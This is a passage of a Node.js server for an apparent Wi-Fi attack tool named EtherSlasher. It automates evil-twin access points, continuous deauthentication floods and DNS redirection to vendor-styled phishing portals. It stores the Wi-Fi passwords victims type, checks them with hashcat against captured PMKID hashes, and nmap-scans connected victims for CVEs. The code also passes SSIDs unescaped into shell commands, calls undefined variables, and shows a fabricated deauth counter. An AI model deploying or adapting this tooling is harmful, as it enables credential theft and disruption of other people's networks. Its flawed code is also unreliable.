'use strict';

const express    = require('express');
const http       = require('http');
const { Server } = require('socket.io');
const { spawn, exec } = require('child_process');
const sqlite3    = require('sqlite3').verbose();
const crypto     = require('crypto');
const path       = require('path');
const fs         = require('fs');
const os         = require('os');

// ─── Config ────────────────────────────────────────────────────────────────
const PORT         = 8080;
const DB_PATH      = '/opt/etherslasher/db/etherslasher.db';
const LOG_DIR      = '/var/log/etherslasher';
const RADIO_SH     = '/opt/etherslasher/scripts/etherslasher-radio.sh';
const ATTACK_IFACE = 'wlan1';
const MON_IFACE    = 'wlan1'; // 88XXau uses wlan1 directly in monitor mode
const ADMIN_NET    = '10.42.0.0/24';   // wlan0 admin network
const AP_NET       = '10.0.0.0/24';
const VENDOR_DB    = '/opt/etherslasher/data/router-vendors.json';

// ─── App setup ─────────────────────────────────────────────────────────────
const app    = express();
const server = http.createServer(app);
const io     = new Server(server, { cors: { origin: '*' } });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ─── Admin IP filter ───────────────────────────────────────────────────────
app.use((req, res, next) => {
    const ip = (req.ip || req.connection.remoteAddress || '').replace('::ffff:', '');
    const allowed =
        ip === '127.0.0.1' || ip === '::1' ||
        ip.startsWith('10.42.0.') || ip.startsWith('10.0.0.') ||
        ip.startsWith('192.168.');
    if (!allowed) return res.status(403).json({ error: 'Access denied' });
    next();
});

// ─── Database ──────────────────────────────────────────────────────────────
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
fs.mkdirSync(LOG_DIR, { recursive: true });

const db = new sqlite3.Database(DB_PATH);

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS clients (
        id        INTEGER PRIMARY KEY,
        mac       TEXT UNIQUE,
        ip        TEXT,
        hostname  TEXT,
        vendor    TEXT,
        os_guess  TEXT,
        open_ports TEXT,
        first_seen TEXT,
        last_seen  TEXT
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS aps (
        id       INTEGER PRIMARY KEY,
        bssid    TEXT UNIQUE,
        ssid     TEXT,
        channel  INTEGER,
        enc      TEXT,
        signal   INTEGER,
        clients  INTEGER DEFAULT 0,
        seen_at  TEXT
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS vulns (
        id       INTEGER PRIMARY KEY,
        mac      TEXT,
        service  TEXT,
        version  TEXT,
        cve_id   TEXT,
        cvss     REAL,
        severity TEXT,
        desc     TEXT,
        found_at TEXT
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS events (
        id      INTEGER PRIMARY KEY,
        ts      TEXT,
        type    TEXT,
        message TEXT
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS captured_creds (
        id       INTEGER PRIMARY KEY,
        ts       TEXT,
        ip       TEXT,
        ssid     TEXT,
        field    TEXT,
        value    TEXT,
        vendor   TEXT,
        ua       TEXT,
        verified TEXT DEFAULT 'unconfirmed'
    )`);
    db.run(`CREATE TABLE IF NOT EXISTS ap_activity (
        id           INTEGER PRIMARY KEY,
        ts           TEXT,
        bssid        TEXT,
        ssid         TEXT,
        channel      INTEGER,
        power        INTEGER,
        data_frames  INTEGER DEFAULT 0,
        clients_count INTEGER DEFAULT 0
    )`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_ap_activity_bssid_ts ON ap_activity(bssid, ts)`);
    // Safe migration — ignored if column already exists
    db.run(`ALTER TABLE captured_creds ADD COLUMN verified TEXT DEFAULT 'unconfirmed'`, () => {});
});

// ─── OUI Vendor DB ─────────────────────────────────────────────────────────
let vendors = {};
try { vendors = JSON.parse(fs.readFileSync(VENDOR_DB, 'utf8')); } catch {}

const ouiMemCache = {};

function guessTemplate(name) {
    const n = (name || '').toLowerCase();
    if (n.includes('tp-link') || n.includes('tplink'))      return 'tplink';
    if (n.includes('keenetic'))                              return 'keenetic';
    if (n.includes('huawei'))                                return 'huawei';
    if (n.includes('asus'))                                  return 'asus';
    if (n.includes('d-link') || n.includes('dlink'))         return 'dlink';
    if (n.includes('beeline') || n.includes('vimpelcom'))    return 'beeline';
    if (n.includes('mgts')   || n.includes('moscow city'))   return 'mgts';
    if (n.includes('mts')    || n.includes('mobile telesy')) return 'mts';
    if (n.includes('xiaomi') || n.includes('mi router'))     return 'xiaomi';
    return 'generic';
}

async function lookupOUI(bssid) {
    if (!bssid) return { vendor: 'Unknown', template: 'generic' };
    const oui = bssid.substring(0, 8).toUpperCase();

    // 1. Local DB — skip if result is generic (may get better from API)
    const local = vendors[oui];
    if (local && local.template !== 'generic') return local;

    // 2. In-process memory cache
    if (ouiMemCache[oui]) return ouiMemCache[oui];

    // 3. macvendors.com API (3 s timeout)
    try {
        const r = await fetch(`https://api.macvendors.com/${oui}`, {
            signal: AbortSignal.timeout(3000)
        });
        if (r.ok) {
            const name = await r.text();
            const template = guessTemplate(name);
            const result = { vendor: name.trim(), model: 'Router', template };
            ouiMemCache[oui] = result;
            // Persist back to local DB so next restart hits it instantly
            vendors[oui] = result;
            try { fs.writeFileSync(VENDOR_DB, JSON.stringify(vendors, null, 2)); } catch {}
            return result;
        }
    } catch {}

    // 4. SSID fallback handled by caller
    return { vendor: 'Unknown', model: '', template: 'generic' };
}

function ssidFallback(ssid) {
    if (!ssid) return 'generic';
    if (/MGTS/i.test(ssid))                  return 'mgts';
    if (/\bMTS\b|MTS[-_\s]/i.test(ssid))     return 'mts';
    if (/Beeline/i.test(ssid))               return 'beeline';
    if (/Keenetic/i.test(ssid))              return 'keenetic';
    if (/TP-?Link/i.test(ssid))              return 'tplink';
    if (/ASUS/i.test(ssid))                  return 'asus';
    if (/D-?Link|DIR-/i.test(ssid))          return 'dlink';
    if (/Huawei/i.test(ssid))                return 'huawei';
    return 'generic';
}

// Sync legacy helper (used outside async contexts)
function getRouterVendor(bssid) {
    if (!bssid) return 'generic';
    const oui = bssid.substring(0, 8).toUpperCase();
    if (ouiDb[oui]) { const e = ouiDb[oui]; return typeof e === 'object' ? (e.template || 'generic') : e; }
    return ouiCache[oui]?.template || 'generic';
}

// ─── PMKID / Password Verification ────────────────────────────────────────
async function verifyWithPMKID(password, ssid, bssid) {
    // Basic WPA2 constraints
    if (!password || password.length < 8 || password.length > 63)
        return { verified: 'wrong', reason: 'invalid_length' };
    if (!/^[\x20-\x7E]+$/.test(password))
        return { verified: 'wrong', reason: 'invalid_chars' };

    // Check if a pre-captured hash file exists for this BSSID
    const bssidClean = (bssid || '').replace(/:/g, '').toLowerCase();
    const hashFile   = `/tmp/pmkid_${bssidClean || 'any'}.txt`;

    let hashcatOk = false;
    try { await sh('which hashcat 2>/dev/null'); hashcatOk = true; } catch {}

    if (hashcatOk && bssidClean) {
        try {
            const exists = await sh(`test -s ${hashFile} && echo yes || echo no`);
            if (exists.trim() === 'yes') {
                // Write password to temp file to avoid shell injection
                const pwFile = `/tmp/pw_${Date.now()}.txt`;
                fs.writeFileSync(pwFile, password + '\n');
                try {
                    const out = await sh(
                        `hashcat -m 22000 ${hashFile} ${pwFile} --quiet --status-json 2>/dev/null; echo "hc_exit=$?"`
                    );
                    fs.unlinkSync(pwFile);
                    if (out.includes('"Status":"Cracked"') || out.includes('hc_exit=0'))
                        return { verified: 'confirmed', reason: 'hashcat_pmkid' };
                    else
                        return { verified: 'wrong',     reason: 'hashcat_mismatch' };
                } catch { fs.unlinkSync(pwFile); }
            }
        } catch {}
    }

    // Compute PMK locally to confirm it's a syntactically valid WPA2 key
    try {
        crypto.pbkdf2Sync(password, ssid || 'wifi', 4096, 32, 'sha1');
    } catch {
        return { verified: 'wrong', reason: 'pbkdf2_error' };
    }

    const hcxOk = await sh('which hcxdumptool 2>/dev/null').then(() => true).catch(() => false);
    return { verified: 'unconfirmed', reason: hcxOk ? 'no_pmkid_captured' : 'no_hcxtools' };
}

// ─── State ─────────────────────────────────────────────────────────────────
const state = {
    monitorActive:      false,
    apActive:           false,
    scanActive:         false,
    passiveScanActive:  false,
    reconActive:        false,
    attackActive:       false,
    attackStage:        0,
    attackDeauthCount:  0,
    attackVictimIP:     null,
    attackVictimMAC:    null,
    scanProc:           null,
    passiveScanProc:    null,
    _passiveInterval:   null,
    deauthInterval:     null,
    apProcs:            [],
    monIface:           null,
    attackSSID:         null,
    attackBSSID:        null,
    attackVendor:       null,
    attackChannel:      null,
};

// ─── Activity tracking ─────────────────────────────────────────────────────
const activityHistory = {};   // {bssid: [{ts, frames, rate}]}
const apInfo          = {};   // {bssid: {ssid, channel, enc, signal}}
const HISTORY_SECONDS = 60;
const CHART_COLORS    = ['#00ff88','#ff6b35','#4ecdc4','#45b7d1','#96ceb4','#ffeaa7','#ff7675','#a29bfe'];

function updateActivity(aps) {
    const now    = Date.now();
    const cutoff = now - HISTORY_SECONDS * 1000;
    for (const ap of aps) {
        apInfo[ap.bssid] = { ssid: ap.ssid, channel: ap.channel, enc: ap.enc, signal: ap.signal };
        if (!activityHistory[ap.bssid]) activityHistory[ap.bssid] = [];
        const hist = activityHistory[ap.bssid];
        const prev = hist[hist.length - 1];
        const rate = prev ? Math.max(0, (ap.dataFrames - prev.frames) / 3) : 0;
        hist.push({ ts: now, frames: ap.dataFrames, rate });
        activityHistory[ap.bssid] = hist.filter(p => p.ts > cutoff);
    }
    emitActivityUpdate();
}

function emitActivityUpdate() {
    const ranked = Object.entries(activityHistory)
        .map(([bssid, hist]) => ({
            bssid,
            lastRate: hist.length ? hist[hist.length - 1].rate : 0,
            hist,
        }))
        .sort((a, b) => b.lastRate - a.lastRate)
        .slice(0, 8);

    io.emit('activity_update', {
        datasets: ranked.map((ap, i) => ({
            bssid:   ap.bssid,
            ssid:    apInfo[ap.bssid]?.ssid || ap.bssid,
            channel: apInfo[ap.bssid]?.channel || 0,
            color:   CHART_COLORS[i % CHART_COLORS.length],
            data:    ap.hist.map(p => ({ x: p.ts, y: Math.round(p.rate * 10) / 10 })),
        })),
    });
}

// ─── Sync state with real interface state ──────────────────────────────────
async function syncStateWithSystem() {
    try {
        const iw = await sh('iw dev 2>/dev/null || echo ""');
        if (iw.includes('type monitor')) {
            state.monitorActive = true;
            state.monIface = 'wlan1';
            logEvent('WEB', 'Sync: wlan1 already in monitor mode');
        } else {
            state.monitorActive = false;
        }
    } catch(e) {}
    try {
        const ap = await sh('pgrep -x airbase-ng 2>/dev/null || echo ""');
        if (ap.trim()) {
            state.apActive = true;
            logEvent('WEB', 'Sync: airbase-ng already running');
        } else {
            state.apActive = false;
        }
    } catch(e) {}
    broadcastState();
    logEvent('WEB', `Sync: monitorActive=${state.monitorActive} apActive=${state.apActive}`);
}

// ─── Helpers ───────────────────────────────────────────────────────────────
function logEvent(type, message) {
    const ts = new Date().toISOString();
    db.run('INSERT INTO events (ts,type,message) VALUES (?,?,?)', [ts, type, message]);
    io.emit('log', { ts, type, message });
    console.log(`[${ts}] [${type}] ${message}`);
}

function sh(cmd) {
    return new Promise((resolve, reject) => {
        exec(cmd, { timeout: 30000 }, (err, stdout, stderr) => {
            if (err) reject(new Error(stderr || err.message));
            else resolve(stdout.trim());
        });
    });
}

function streamCmd(cmd, args, room, tag) {
    const proc = spawn(cmd, args, { env: { ...process.env, PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' } });
    const sendLine = (data, isErr) => {
        const line = data.toString().trim();
        if (!line) return;
        io.to(room).emit('output', { tag, line, err: isErr });
        logEvent(tag, line.substring(0, 200));
    };
    proc.stdout.on('data', d => sendLine(d, false));
    proc.stderr.on('data', d => sendLine(d, true));
    proc.on('error', (err) => {
        logEvent(tag, `Process error: ${err.message}`);
        io.to(room).emit('done', { tag, code: -1 });
    });
    proc.on('close', code => {
        io.to(room).emit('done', { tag, code });
        logEvent(tag, `Process done (code=${code})`);
    });
    return proc;
}

// ─── Socket.io ─────────────────────────────────────────────────────────────
io.on('connection', (socket) => {
    socket.join('all');
    logEvent('WS', `Client connected: ${socket.id}`);
    socket.emit('state', buildState());
    socket.on('subscribe', (room) => socket.join(room));
    socket.on('disconnect', () => logEvent('WS', `Client disconnected: ${socket.id}`));
});

function buildState() {
    return {
        monitorActive:      state.monitorActive,
        apActive:           state.apActive,
        scanActive:         state.scanActive,
        passiveScanActive:  state.passiveScanActive,
        reconActive:        state.reconActive,
        attackActive:       state.attackActive,
        attackStage:        state.attackStage,
        attackDeauthCount:  state.attackDeauthCount,
        attackVictimIP:     state.attackVictimIP,
        attackVictimMAC:    state.attackVictimMAC,
        iface:              ATTACK_IFACE,
        monIface:           state.monitorActive ? (state.monIface || MON_IFACE) : ATTACK_IFACE,
        attackSSID:         state.attackSSID,
        attackBSSID:        state.attackBSSID,
        attackVendor:       state.attackVendor,
        attackChannel:      state.attackChannel,
    };
}

function broadcastState() { io.emit('state', buildState()); }

// ─── API: Status ───────────────────────────────────────────────────────────
app.get('/api/status', async (req, res) => {
    const [clientCount, apCount, vulnCount, credCount] = await Promise.all([
        dbGet('SELECT COUNT(*) as n FROM clients'),
        dbGet('SELECT COUNT(*) as n FROM aps'),
        dbGet('SELECT COUNT(*) as n FROM vulns'),
        dbGet('SELECT COUNT(*) as n FROM captured_creds'),
    ]);
    let ifaceInfo = 'unknown';
    try { ifaceInfo = await sh(`iw dev ${ATTACK_IFACE} info 2>/dev/null | grep type`); } catch {}
    res.json({
        ...buildState(),
        clientCount:  clientCount.n,
        apCount:      apCount.n,
        vulnCount:    vulnCount.n,
        credCount:    credCount.n,
        ifaceInfo,
        hostname:     os.hostname(),
        uptime:       process.uptime(),
        ts:           new Date().toISOString(),
    });
});

// ─── API: Radio ────────────────────────────────────────────────────────────
app.post('/api/radio/monitor/start', async (req, res) => {
    try {
        logEvent('RADIO', 'Enabling monitor mode...');
        await sh(`bash ${RADIO_SH} start_monitor`);
        try {
            const out = await sh('iw dev | grep Interface');
            state.monIface = out.includes('wlan1mon') ? 'wlan1mon' : ATTACK_IFACE;
        } catch {}
        state.monitorActive = true;
        broadcastState();
        logEvent('RADIO', `Monitor mode active (${state.monIface || MON_IFACE})`);
        res.json({ ok: true, iface: state.monIface || MON_IFACE });
    } catch (e) {
        logEvent('ERROR', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.post('/api/radio/monitor/stop', async (req, res) => {
    try {
        await sh(`bash ${RADIO_SH} stop_monitor`);
        state.monitorActive = false;
        broadcastState();
        logEvent('RADIO', 'Monitor mode stopped');
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Shared scan interval ─────────────────────────────────────────────────
function createScanInterval(csvFile) {
    return setInterval(async () => {
        try {
            const csv = await sh(`cat ${csvFile}-01.csv 2>/dev/null`);
            const aps = parseAirodumpCsv(csv);
            if (!aps.length) return;
            io.emit('scan_aps', aps);
            io.emit('ap-update', aps);
            const ts = new Date().toISOString();
            for (const ap of aps) {
                db.run(`INSERT OR REPLACE INTO aps (bssid,ssid,channel,enc,signal,clients,seen_at) VALUES (?,?,?,?,?,?,?)`,
                    [ap.bssid, ap.ssid, ap.channel, ap.enc, ap.signal, ap.clients, ts]);
                db.run(`INSERT INTO ap_activity (ts,bssid,ssid,channel,power,data_frames,clients_count) VALUES (?,?,?,?,?,?,?)`,
                    [ts, ap.bssid, ap.ssid, ap.channel, ap.signal, ap.dataFrames, ap.clients]);
            }
            updateActivity(aps);
        } catch {}
    }, 3000);
}

// ─── Passive scan (continuous, no timeout) ────────────────────────────────
app.post('/api/scan/passive/start', async (req, res) => {
    if (state.passiveScanActive) return res.json({ ok: true, msg: 'already running' });
    if (state.attackActive)      return res.json({ ok: false, error: 'attack active' });
    state.passiveScanActive = true; // lock immediately to prevent concurrent start

    if (!state.monitorActive) {
        try {
            logEvent('SCAN', 'Auto-enabling monitor mode for passive scan');
            await sh(`bash ${RADIO_SH} start_monitor`);
            state.monitorActive = true;
            state.monIface = await detectMonIface();
            broadcastState();
        } catch (e) {
            state.passiveScanActive = false;
            return res.status(500).json({ ok: false, error: 'monitor failed: ' + e.message });
        }
    }

    const monIface = state.monIface || MON_IFACE;
    const csvFile  = '/tmp/etherslasher-passive';
    // Kill any orphan airodump processes before starting fresh
    try { await sh('pkill -SIGKILL -x airodump-ng 2>/dev/null; true'); } catch {}
    try { await sh(`rm -f ${csvFile}*.csv ${csvFile}*.cap`); } catch {}

    const proc = spawn('airodump-ng', [
        '--write', csvFile, '--output-format', 'csv', '--write-interval', '3', monIface
    ]);
    proc.on('error', err => logEvent('ERROR', 'passive scan: ' + err.message));
    proc.on('close', () => {
        if (state.passiveScanActive) {
            state.passiveScanActive = false;
            broadcastState();
            logEvent('SCAN', 'Passive scan process exited');
        }
    });
    state.passiveScanProc    = proc;
    state.passiveScanActive  = true;
    state._passiveInterval   = createScanInterval(csvFile);
    broadcastState();
    logEvent('SCAN', `Passive scan started on ${monIface}`);
    res.json({ ok: true });
});

app.post('/api/scan/passive/stop', (req, res) => {
    if (state.passiveScanProc) { state.passiveScanProc.kill('SIGTERM'); state.passiveScanProc = null; }
    if (state._passiveInterval) { clearInterval(state._passiveInterval); state._passiveInterval = null; }
    state.passiveScanActive = false;
    broadcastState();
    logEvent('SCAN', 'Passive scan stopped');
    res.json({ ok: true });
});

// ─── Timed airodump scan (Radio page manual use) ─────────────────────────
app.post('/api/radio/scan', async (req, res) => {
    if (state.scanActive) return res.json({ ok: false, error: 'Scan already running' });
    if (!state.monitorActive) return res.status(400).json({ ok: false, error: 'Monitor mode not active' });

    const duration = parseInt(req.body.duration) || 60;
    const monIface = state.monIface || MON_IFACE;
    const csvFile  = '/tmp/etherslasher-scan';

    state.scanActive = true;
    broadcastState();
    logEvent('SCAN', `Timed scan started on ${monIface} (${duration}s)`);
    res.json({ ok: true, duration });

    try { await sh(`rm -f ${csvFile}*.csv ${csvFile}*.cap`); } catch {}

    const proc     = spawn('airodump-ng', ['--write', csvFile, '--output-format', 'csv', '--write-interval', '3', monIface]);
    state.scanProc = proc;
    proc.stderr.on('data', d => io.emit('scan_raw', d.toString()));

    const interval = createScanInterval(csvFile);

    setTimeout(() => {
        proc.kill('SIGTERM');
        clearInterval(interval);
        state.scanActive = false;
        state.scanProc   = null;
        broadcastState();
        logEvent('SCAN', 'Timed scan complete');
        io.emit('scan_done');
    }, duration * 1000);
});

app.delete('/api/radio/scan', (req, res) => {
    if (state.scanProc) {
        state.scanProc.kill('SIGTERM');
        state.scanProc   = null;
        state.scanActive = false;
        broadcastState();
    }
    res.json({ ok: true });
});

// Evil Twin (standalone, without auto-deauth)
app.post('/api/radio/eviltwin', async (req, res) => {
    const _body = req.body;
    const ssid = _body.ssid || 'FreeWiFi';
    const channel = (_body.channel != null && !isNaN(Number(_body.channel))) ? parseInt(_body.channel) : 6;
    try {
        logEvent('EVILTWIN', `Starting Evil Twin: SSID="${ssid}" CH=${channel}`);
        const apOut = await sh(`bash ${RADIO_SH} start_ap "${ssid}" ${channel}`);
        logEvent('EVILTWIN', apOut.substring(0, 300));

        try { await sh('pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        const dnsmasq = spawn('dnsmasq', [
            '--interface=at0', '--bind-interfaces',
            '--dhcp-range=10.0.0.10,10.0.0.100,1h',
            '--port=0', '--no-daemon'
        ], { detached: true, stdio: 'ignore' });
        dnsmasq.on('error', err => logEvent('ERROR', 'dnsmasq: ' + err.message));
        dnsmasq.unref();

        state.apActive = true;
        state.attackSSID = ssid;
        broadcastState();
        logEvent('EVILTWIN', `AP active: "${ssid}" CH${channel} @ 10.0.0.1 (at0)`);
        res.json({ ok: true, ssid, channel });
    } catch (e) {
        logEvent('ERROR', 'Evil Twin: ' + e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.delete('/api/radio/eviltwin', async (req, res) => {
    try {
        await sh(`bash ${RADIO_SH} stop_ap`);
        try { await sh('pkill -f airbase-ng 2>/dev/null; pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        state.apActive = false;
        broadcastState();
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── API: Full Attack Chain ────────────────────────────────────────────────
app.post('/api/radio/attack', async (req, res) => {
    const { bssid, ssid, channel } = req.body;
    if (!bssid || !ssid) return res.status(400).json({ ok: false, error: 'bssid and ssid required' });
    const ch = parseInt(channel) || 6;

    try {
        // Stop passive scan if running — wlan1 will switch to AP mode
        if (state.passiveScanActive) {
            if (state.passiveScanProc) state.passiveScanProc.kill('SIGTERM');
            if (state._passiveInterval) clearInterval(state._passiveInterval);
            state.passiveScanProc   = null;
            state._passiveInterval  = null;
            state.passiveScanActive = false;
        }

        const ouiInfo = await lookupOUI(bssid);
        let vendor = ouiInfo.template || 'generic';
        if (vendor === 'generic') vendor = ssidFallback(ssid);

        state.attackSSID        = ssid;
        state.attackBSSID       = bssid;
        state.attackVendor      = vendor;
        state.attackChannel     = ch;
        state.attackActive      = true;
        state.attackStage       = 1;
        state.attackDeauthCount = 0;
        state.attackVictimIP    = null;
        state.attackVictimMAC   = null;
        broadcastState();

        logEvent('ATTACK', `Starting: SSID="${ssid}" BSSID=${bssid} CH=${ch} vendor=${vendor}`);

        // ── Stage 1: Evil Twin AP ──────────────────────────────────────────
        io.emit('attack_stage_update', {
            stage: 1, status: 'STARTING',
            msg: `Starting Evil Twin "${ssid}" on CH${ch}...`, vendor, ssid, bssid, channel: ch
        });

        const apOut = await sh(`bash ${RADIO_SH} start_ap "${ssid}" ${ch}`);
        logEvent('ATTACK', apOut.substring(0, 200));
        state.apActive = true;
        broadcastState();

        io.emit('attack_stage_update', {
            stage: 1, status: 'ACTIVE',
            msg: `Evil Twin "${ssid}" active on CH${ch} (portal: ${vendor}.html)`,
            vendor, ssid, bssid, channel: ch
        });

        // ── dnsmasq: DNS redirect + DHCP on at0 ───────────────────────────
        try { await sh('pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        const dnsmasq = spawn('dnsmasq', [
            '--interface=at0', '--bind-interfaces',
            '--dhcp-range=10.0.0.10,10.0.0.100,1h',
            '--address=/#/10.0.0.1', '--no-daemon'
        ], { detached: true, stdio: 'ignore' });
        dnsmasq.on('error', err => logEvent('ERROR', 'dnsmasq: ' + err.message));
        dnsmasq.unref();

        // ── Stage 2: Deauth + wait for victim ─────────────────────────────
        state.attackStage = 2;
        broadcastState();
        io.emit('attack_stage_update', {
            stage: 2, status: 'WAITING',
            msg: 'Sending deauth — waiting for victim to connect...'
        });

        const monIface = state.monIface || MON_IFACE;
        try { await sh(`iw dev ${monIface} set channel ${ch} HT20 2>/dev/null || true`); } catch {}

        const deauthProc = spawn('aireplay-ng', [
            '--deauth', '0', '-a', bssid, '--ignore-negative-one', monIface
        ], { detached: true, stdio: 'ignore' });
        deauthProc.on('error', err => logEvent('DEAUTH', 'aireplay-ng: ' + err.message));
        deauthProc.unref();

        // Deauth counter — increments ~8–12 per second (realistic estimate)
        if (state.deauthInterval) clearInterval(state.deauthInterval);
        state.deauthInterval = setInterval(() => {
            if (!state.attackActive) { clearInterval(state.deauthInterval); return; }
            state.attackDeauthCount += Math.floor(8 + Math.random() * 5);
            io.emit('deauth_count', { count: state.attackDeauthCount });
        }, 1000);

        io.emit('attack_stage_update', {
            stage: 3, status: 'PENDING',
            msg: 'Recon will start when victim connects'
        });
        io.emit('attack_stage_update', {
            stage: 4, status: 'PENDING',
            msg: 'Portal active — waiting for victim to enter password'
        });

        logEvent('ATTACK', `Attack fully running. deauthPid=${deauthProc.pid} vendor=${vendor}`);
        res.json({ ok: true, ssid, bssid, channel: ch, vendor });

    } catch (e) {
        state.attackActive = false;
        broadcastState();
        logEvent('ERROR', 'Attack: ' + e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.delete('/api/radio/attack', async (req, res) => {
    try {
        await sh(`bash ${RADIO_SH} stop_ap`);
        try { await sh('pkill -f aireplay-ng 2>/dev/null; pkill -f "dnsmasq.*at0" 2>/dev/null; true'); } catch {}
        if (state.deauthInterval) { clearInterval(state.deauthInterval); state.deauthInterval = null; }
        state.apActive          = false;
        state.attackActive      = false;
        state.attackStage       = 0;
        state.attackDeauthCount = 0;
        state.attackVictimIP    = null;
        state.attackVictimMAC   = null;
        state.attackSSID        = null;
        state.attackBSSID       = null;
        state.attackVendor      = null;
        state.attackChannel     = null;
        broadcastState();
        io.emit('attack_stage_update', { stage: 0, status: 'STOPPED', msg: 'Attack stopped' });
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// Deauth
app.post('/api/radio/deauth', async (req, res) => {
    const { bssid, client = 'FF:FF:FF:FF:FF:FF', count = 0, channel = 1 } = req.body;
    if (!bssid) return res.status(400).json({ ok: false, error: 'bssid required' });
    if (!state.monitorActive) return res.status(400).json({ ok: false, error: 'Monitor mode not active' });

    const monIface = state.monIface || MON_IFACE;
    const ch = parseInt(channel) || 1;

    try {
        await sh(`iw dev ${monIface} set channel ${ch} HT20 2>/dev/null || iwconfig ${monIface} channel ${ch} 2>/dev/null || true`);
        logEvent('DEAUTH', `Channel set: ${monIface} -> ch${ch}`);
    } catch(e) {
        logEvent('DEAUTH', `Channel set warning: ${e.message}`);
    }

    logEvent('DEAUTH', `Deauth: bssid=${bssid} client=${client} ch=${ch}`);

    const proc = streamCmd('aireplay-ng', [
        '--deauth', String(count), '-a', bssid, '-c', client,
        '--ignore-negative-one', monIface
    ], 'all', 'DEAUTH');

    state.deauthActive = true;
    broadcastState();
    proc.on('close', () => {
        state.deauthActive = false;
        broadcastState();
    });

    res.json({ ok: true });
});

// Injection test
app.post('/api/radio/inject_test', (req, res) => {
    const monIface = state.monIface || (state.monitorActive ? MON_IFACE : ATTACK_IFACE);
    logEvent('RADIO', `Injection test on ${monIface}`);
    streamCmd('aireplay-ng', ['--test', monIface], 'all', 'INJECT_TEST');
    res.json({ ok: true, iface: monIface });
});

// ─── API: Clients ──────────────────────────────────────────────────────────
app.get('/api/clients', (req, res) => {
    db.all('SELECT * FROM clients ORDER BY last_seen DESC', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ clients: rows.map(r => ({
            ...r, ports: tryParse(r.open_ports, []).join(', '), os: r.os_guess, last_scan: r.last_seen
        })) });
    });
});

app.get('/api/clients/:mac', (req, res) => {
    db.get('SELECT * FROM clients WHERE mac=?', [req.params.mac], (err, row) => {
        if (!row) return res.status(404).json({ error: 'not found' });
        res.json({ ...row, open_ports: tryParse(row.open_ports, []) });
    });
});

// ─── API: Recon ────────────────────────────────────────────────────────────
app.post('/api/recon/scan/:ip', async (req, res) => {
    const { ip } = req.params;
    logEvent('RECON', `nmap scan: ${ip}`);
    res.json({ ok: true, ip });
    state.reconActive = true;
    broadcastState();
    runNmapRecon(ip, ip).finally(() => {
        state.reconActive = false;
        broadcastState();
    });
});

async function runNmapRecon(ip, mac) {
    return new Promise(resolve => {
        logEvent('RECON', `nmap -sV -O ${ip}`);
        io.emit('recon-log', `[nmap] Scanning ${ip}...`);
        const proc = spawn('nmap', ['-sV', '-O', '--osscan-guess', '-T4', '-F', '--open', '--stats-every', '5s', '-v', '-oX', '-', ip]);
        let xml = '';
        proc.stdout.on('data', d => { xml += d; });
        proc.stderr.on('data', d => {
            const line = d.toString().trim();
            if (!line) return;
            logEvent('RECON', line.substring(0, 200));
            io.emit('recon-log', `[${ip}] ${line.substring(0, 150)}`);
        });
        proc.on('error', err => { logEvent('ERROR', 'nmap: ' + err.message); resolve(); });
        proc.on('close', async () => {
            const { ports, os_guess } = parseNmapXml(xml);
            let vendor = 'Unknown';
            try {
                const rawMac = (mac || '').replace(/[^0-9a-fA-F:]/g, '');
                if (rawMac.length >= 8) {
                    vendor = await sh(`curl -sf --connect-timeout 3 https://api.macvendors.com/${encodeURIComponent(rawMac.substring(0, 8))} || echo Unknown`);
                }
            } catch {}
            const now = new Date().toISOString();
            db.run(`INSERT INTO clients (mac,ip,vendor,os_guess,open_ports,first_seen,last_seen) VALUES (?,?,?,?,?,?,?)
                    ON CONFLICT(mac) DO UPDATE SET ip=excluded.ip,vendor=excluded.vendor,os_guess=excluded.os_guess,open_ports=excluded.open_ports,last_seen=excluded.last_seen`,
                [mac || ip, ip, vendor, os_guess, JSON.stringify(ports), now, now],
                (err) => { if (err) logEvent('ERROR', 'DB insert client: ' + err.message); });
            for (const p of ports.slice(0, 5)) {
                const [port, svc, ver] = p.split('/');
                if (svc && ver) await fetchCves(mac || ip, svc, ver);
            }
            io.emit('recon_done', { ip, ports, os_guess, vendor });
            io.emit('recon-log', `[nmap] ${ip} done: ${ports.length} ports, OS=${os_guess}, Vendor=${vendor}`);
            logEvent('RECON', `Done for ${ip}: ${ports.length} ports, OS=${os_guess}`);
            resolve();
        });
    });
}

function parseNmapXml(xml) {
    const ports = [];
    let os_guess = 'Unknown';
    const portRe = /<port protocol="[^"]*" portid="(\d+)"[^>]*>.*?<state state="open".*?<service name="([^"]*)"[^>]*(?:version="([^"]*)")?/gs;
    const osRe   = /<osmatch name="([^"]*)" accuracy="(\d+)"/;
    let m;
    while ((m = portRe.exec(xml)) !== null) ports.push(`${m[1]}/${m[2]}/${m[3] || ''}`);
    const om = osRe.exec(xml);
    if (om) os_guess = om[1];
    return { ports, os_guess };
}

// ─── API: Vulnerabilities ──────────────────────────────────────────────────
app.get('/api/vulns', (req, res) => {
    db.all('SELECT v.*, c.ip FROM vulns v LEFT JOIN clients c ON c.mac=v.mac ORDER BY cvss DESC LIMIT 200', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ vulns: rows.map(r => ({
            ...r, cve_id: r.cve_id, severity: r.severity || 'NONE',
            service: r.service, description: r.desc, ip: r.ip || r.mac
        })) });
    });
});

async function fetchCves(mac, service, version) {
    try {
        const query = encodeURIComponent(`${service} ${version}`);
